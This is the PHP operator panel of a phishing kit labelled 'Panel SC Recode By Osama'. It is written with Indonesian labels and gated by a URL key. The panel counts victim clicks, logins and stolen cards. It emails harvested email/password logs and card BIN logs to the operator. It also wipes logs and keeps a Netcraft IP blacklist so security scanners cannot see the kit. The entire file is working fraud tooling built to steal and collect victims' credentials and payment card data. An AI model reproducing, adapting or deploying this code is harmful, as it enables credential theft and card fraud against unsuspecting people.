<?php

error_reporting(0);
@require_once "tytyd.php";

if(@$_GET["key"] != $key)
{
	exit('<script>alert("Wkwk Land~")</script><meta http-equiv="refresh" content="0; url=/"/>');
}
?>
<html>
<head>
	<title>Access Panel•</title>
	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</head>
<body style="background: black; color: white;">
	<table width="100%" align="center">
		<tr>
			<td><br/><br/><br/></td>
		</tr>
		<tr align="center">
			<td align="center"><h1>Panel SC Recode By Osama</h1></td>
		</tr>
		<tr>
			<td><br/></td>
		</tr>
		<tr>
			<td align="center">
				<a class="btn btn-primary btn-sm" href="https://<?php echo $_SERVER['SERVER_NAME']."/".$param;?>" target="_blank">Go To Web</a>
			</td>
		</tr>
	</table>
	<br/>
	<br/>
	<br/>
	<table align="center" width="80%" border="1">
		<tr>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr><td colspan="2" align="center">Ganti Email Result</td></tr>
						<tr>
							<td align="center">Email Lama</td>
							<td align="center">Email Baru</td>
						</tr>
						<tr>
							<td align="center">
								<input type="text" class="form-control-sm" size="30" name="lama" value="<?php echo $Your_Email; ?>" required=required readonly="">
							</td>
							<td align="center">
								<input type="text" class="form-control-sm" size="30" name="baru" value"" placeholder="yourmail@domain.com" required=required>
							</td>
						</tr>
						<tr>
							<td align="center" colspan="2">
								<input type="submit" class="btn btn-primary btn-sm" name="email" value="Change Email">
							</td>
						</tr>
					</table>
				</form>
			</td>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr><td colspan="2" align="center">Ganti Parameter SC</td></tr>
						<tr>
							<td align="center">Parameter Lama</td>
							<td align="center">Parameter Baru</td>
						</tr>
						<tr>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="parla" value="<?php echo $param; ?>" required="required" readonly="">
							</td>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="parba" placeholder="New" class="jarak" value="" required=required>
							</td>
						</tr>
						<tr>
							<td colspan="2" align="center">
								<input type="submit" class="btn btn-primary btn-sm" name="param" class="jarak" value="Change Parameter">
							</td>
						</tr>
					</table>
				</form>
			</td>
		</tr>
		<tr>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr><td colspan="2" align="center">Ganti Key Panel</td></tr>
						<tr>
							<td align="center">Key Lama</td>
							<td align="center">Key Baru</td>
						</tr>
						<tr>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="keylama" value="<?php echo $key; ?>" required="required" readonly="">
							</td>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="keybaru" maxlength="8" placeholder="key_baru" value="" required=required>
							</td>
						</tr>
						<tr>
							<td align="center" colspan="2">
								<input type="submit" class="btn btn-primary btn-sm" name="key" value="Change Key">
							</td>
						</tr>
					</table>
				</form>
			</td>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr>
							<td width="30%" align="center">
								<button type="button" class="btn btn-danger btn-sm">
									Click's <span class="badge badge-light"><?php echo empty(@file_get_contents("bocah/logs/._hitz_.txt")) ? "0" : @file_get_contents("bocah/logs/._hitz_.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
							<td width="30%" align="center">
								<button type="button" class="btn btn-danger btn-sm">
									Login's <span class="badge badge-light"><?php echo empty(@file_get_contents("bocah/logs/._loginz_.txt")) ? "0" : @file_get_contents("bocah/logs/._loginz_.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
							<td width="30%" align="center">
								<button type="button" class="btn btn-danger btn-sm">
									CC's <span class="badge badge-light"><?php echo empty(@file_get_contents("bocah/logs/._ccz_.txt")) ? "0" : @file_get_contents("bocah/logs/._ccz_.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
						</tr>
						<tr>
							<td>&nbsp;</td>
							<td>&nbsp;</td>
							<td>&nbsp;</td>
						</tr>
						<tr>
							<td width="30%" align="center"><button class="btn btn-primary btn-sm" name="rd">Reset Query</button></td>
							<td width="30%" align="center"><button class="btn btn-primary btn-sm" name="sd">Send Query</button></td>
							<td width="30%" align="center"><button class="btn btn-primary btn-sm" name="sb">Send Binlist</button></td>
						</tr>
					</table>
				</form>
			</td>
		</tr>
	</table>
	<?php
	@unlink("set.php");

	$lama   = trim(@$_POST['lama']);
	$baru   = trim(@$_POST['baru']);
	$modla = trim(@$_POST['modlama']);
	$modba = trim(@$_POST['modbaru']);
	$emla = trim(@$_POST['emla']);
	$emba = trim(@$_POST['emba']);
	$pasla = trim(@$_POST['pasla']);
	$pasba = trim(@$_POST['pasba']);
	$keylama = trim(@$_POST['keylama']);
	$keybaru = trim(@$_POST['keybaru']);
	$rela = trim(@$_POST['rela']);
	$reba = trim(@$_POST['reba']);
	$resla = trim(@$_POST['resla']);
	$resba = trim(strtolower(@$_POST['resba']));
	$devla = trim(@$_POST['devla']);
	$devba = trim(strtolower(@$_POST['devba']));
	$parla = trim(@$_POST['parla']);
	$parba = trim(@$_POST['parba']);
	$file   = "tytyd.php";
	$isi    = @file_get_contents($file);

	if(isset($_POST['email'])) {
		if(@preg_match("#\b$lama\b#is", $isi)) {
			$isi = str_replace($lama,$baru,$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
		}
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['mode'])) {
		if(@preg_match("#True_Login = $modla#is", $isi)) {
			$isi = str_replace("$modla; // True Login Mode","$modba; // True Login Mode",$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_mode'/>";
		}    
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['elang'])) {
		if(@preg_match("#elang = $emla#is", $isi)) {
			$isi = str_replace("$emla; // MinLength Email","$emba; // MinLength Email",$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_email_length'/>";
		}    
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['plang'])) {
		if(@preg_match("#plang = $pasla#is", $isi)) {
			$isi = str_replace("$pasla; // MinLength Pass","$pasba; // MinLength Pass",$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_pass_length'/>";
		}    
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['key'])) {
		if(@preg_match("#\b$keylama\b#is", $isi)) {
			$isi = str_replace($keylama,$keybaru,$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/bs/$keybaru#ganti_key'/>";
		}
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['reload'])) {
		if(@preg_match("#reloads = $rela#is", $isi)) {
			$isi = str_replace("$rela; // tot reload","$reba; // tot reload",$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_total_reload'/>";
		}    
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['param'])) {
		if(@preg_match("#param = \"$parla\"#is", $isi)) {
			$isi = str_replace("$parla\"; // Parameter Redirect","$parba\"; // Parameter Redirect",$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			@rename($parla.".php",$parba.".php");

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_parameter'/>";
		}    
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['result'])) {
		if(@preg_match("#res = \"$resla#is", $isi)) {
			$isi = str_replace("$resla\"; // Mode Result","$resba\"; // Mode Result",$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_pass_length'/>";
		}    
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['device'])) {
		if(@preg_match("#devia = \"$devla#is", $isi)) {
			$isi = str_replace("$devla\"; // Device Access","$devba\"; // Device Access",$isi);
			$buka = @fopen($file,'w');
			@fwrite($buka,$isi);
			fclose($buka);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#ganti_device_access'/>";
		}    
		else
			echo "<script>alert('DONE~OSAMAPROTECT')</script>";
	}
	else if(isset($_POST['rd'])) {
		@unlink("._no_.txt");
		@unlink("._nob_.txt");
		@unlink("bocah/logs/._hitz_.txt");
		@unlink("bocah/logs/._loginz_.txt");
		@unlink("bocah/logs/._ccz_.txt");
		@unlink("._logz_.txt");
		@unlink("bocah/logs/bxp.log");
		@unlink("bocah/logs/bin.log");
		@unlink("error_log");
		@unlink("._ssid.txt");
	   // @unlink("bocah/includes/blacklist.dat");
		@unlink("bocah/logs/accepted_visitors.txt");
		@unlink("bocah/logs/ip2_log.txt");
		@unlink("bocah/logs/denied_visitors.txt");
		@unlink("bocah/logs/visitor_logged_in.txt");

		$filee = @file_get_contents("bocah/includes/blacklist.dat");
		$cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
		$buka = @fopen("bocah/includes/blacklist.dat",'w');
		@fwrite($buka,$cek[0][0]."\r\r");
		@fclose($buka);

		echo "<script>alert('Succes OSAMAPROTECT')</script>";
		echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
	}
	else if(isset($_POST['sd'])) {
		$empass          = @file_get_contents("bocah/logs/bxp.log");
		$total          = substr_count($empass,"@");

		if($total <= 0)
		{
			echo '<script>alert("DONE~OSAMAPROTECT")</script>';
		}
		else
		{
			$fil = "._no_.txt";
			$last = (@file_get_contents($fil) == "" ? "1" : @file_get_contents($fil));
			$urut = fopen($fil,"w");
			fwrite($urut,$last+1);
			fclose($urut);

			$headers          = "From: Email Password <emailpassword@kiiara.ayden>\r\n";
			$headers         .= "Reply-to: emailpassword@kiiara.ayden\r\n";
			$headers         .= "MIME-Version: 1.0\r\n";
			$headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
			$subj            = "[ Empas #$last ] [ Total $total Lines ] [ ".date("D, d-F-y H:i")." ]";
			$to              = $Your_Email;
			$data            = "------------------------- ZRAV PROTECT --------------------------

			-----------------------------------------------------------------
			$empass
			-----------------------------------------------------------------";

			@mail($to, $subj, $data, $headers);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#send_empas'/>";
		}
	}
	else if(isset($_POST['sb'])) {
		$binbin          = @file_get_contents("bocah/logs/bin.log");
		$total          = substr_count($binbin,"[");

		if($total <= 0)
		{
			echo '<script>alert("DONE~OSAMAPROTECT</script>';
		}
		else
		{
			$fil = "._nob_.txt";
			$last = (@file_get_contents($fil) == "" ? "1" : @file_get_contents($fil));
			$urut = fopen($fil,"w");
			fwrite($urut,$last+1);
			fclose($urut);

			$headers          = "From: Bin Colletions <bin@kiiara.ayden>\r\n";
			$headers         .= "Reply-to: bin@kiiara.ayden\r\n";
			$headers         .= "MIME-Version: 1.0\r\n";
			$headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
			$subj            = "[ Bin #$last ] [ Total $total Cards ] [ ".date("D, d-F-y H:i")." ]";
			$to              = $Your_Email;
			$data            = "------------------------- ZRAV PROTECT --------------------------

			-----------------------------------------------------------------
			$binbin
			-----------------------------------------------------------------";

			@mail($to, $subj, $data, $headers);

			echo "<script>alert('Succes OSAMAPROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#send_bin'/>";
		}
	}
	else if(isset($_POST['sl'])) {
		$fil2 = "._logz_.txt";
		$lasts = (@file_get_contents($fil2) == "" ? "1" : @file_get_contents($fil2));
		$urut = fopen($fil2,"w");
		fwrite($urut,$lasts+1);
		fclose($urut);

		$headers          = "From: Spam Report <report@kiiara.ayden>\r\n";
		$headers         .= "Reply-to: report@kiiara.ayden\r\n";
		$headers         .= "MIME-Version: 1.0\r\n";
		$headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
		$subj            = "[ Report #$lasts ] [ Z420 Scampage ] [ ".date("D, d-F-y H:i")." ]";
		$to              = $Your_Email;
		$tor = $tglorder;
		$tcl = (@file_get_contents("bocah/logs/._hitz_.txt") == "" ? "0" : @file_get_contents("bocah/logs/._hitz_.txt"));
		$tlo = (@file_get_contents("bocah/logs/._loginz_.txt") == "" ? "0" : @file_get_contents("bocah/logs/._loginz_.txt"));
		$tcc = (@file_get_contents("bocah/logs/._ccz_.txt") == "" ? "0" : @file_get_contents("bocah/logs/._ccz_.txt"));
		$tlh = substr_count(@file_get_contents("._ssid.txt")," ");
		$det = array("u" => $_SERVER['SERVER_NAME'],"p" => $_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"],"m" => $umurlog,"tc" => $tcl,"tl" => $tlo,"tcc" => $tcc,"lh" => $tlh);
		$data            = "
		------------------------- ZRAV PROTECT --------------------------

		-----------------------------------------------------------------
		* Domen Scam     :   ".$det['u']."
		* Panel Scam       :   ".$det['p']."
		* Umur Scam        :   ".$det['m']." hari
		* Tanggal Order    :   ".$tor."
		* Total Load          :   ".$det['lh']."
		* Total Klik            :   ".$det['tc']."
		* Total Login         :   ".$det['tl']."
		* Total Card          :   ".$det['tcc']."
		------------------------------------------------------------------";

		@mail($to, $subj, $data, $headers);

		echo "<script>alert('Succes OSAMAPROTECT')</script>";
		echo "<meta http-equiv='refresh' content='0; url=#send_report'/>";
	}
	?>
</body>
</html>